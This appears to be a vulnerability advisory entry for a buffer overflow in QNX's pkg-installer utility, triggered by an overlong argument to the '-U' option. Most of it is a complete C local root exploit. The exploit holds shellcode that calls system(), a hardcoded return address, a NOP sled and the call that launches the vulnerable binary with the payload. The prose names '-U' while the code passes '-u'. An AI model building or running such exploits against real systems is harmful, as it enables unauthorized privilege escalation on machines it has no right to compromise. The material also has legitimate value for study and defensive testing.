source: http://www.securityfocus.com/bid/4918/info

It has been reported that the pkg-installer utility for QNX is vulnerable to a buffer overflow condition.

The vulnerability is a result of an unbounded string copy of the argument to the "-U" commandline option of pkg-installer to a local buffer. 

/* Quick and dirty QNX pkg-installer root exploit.
 * The shellcode sucks, it is longer than it has
 * to be and you need the address to system() for 
 * it to work. Yes I know I'm lazy....
 * 
 * http://www.badc0ded.com 
*/

main(int argc, char **argv)
{
   int ret=0x804786d;
   char *pret;
   char s[]="\xeb\x0e\x31\xc0\x5b"
            "\x88\x43\x2\x53\xbb"
            "\xe4\xb4\x04\x08"       //system() address
            "\xff\xd3\xe8\xed\xff"
	    "\xff\xff\x73\x68";
   char payload[2000];
   if (argc>=2)
      ret=ret-atoi(argv[1]);
   pret=&ret;
   printf("using ret %x\n",ret);
   memset(payload,0x90,1254);
   sprintf(payload+1254,"%s%s",s,pret);
   execlp("/usr/photon/bin/pkg-installer","pkg-installer","-u",payload,0);

}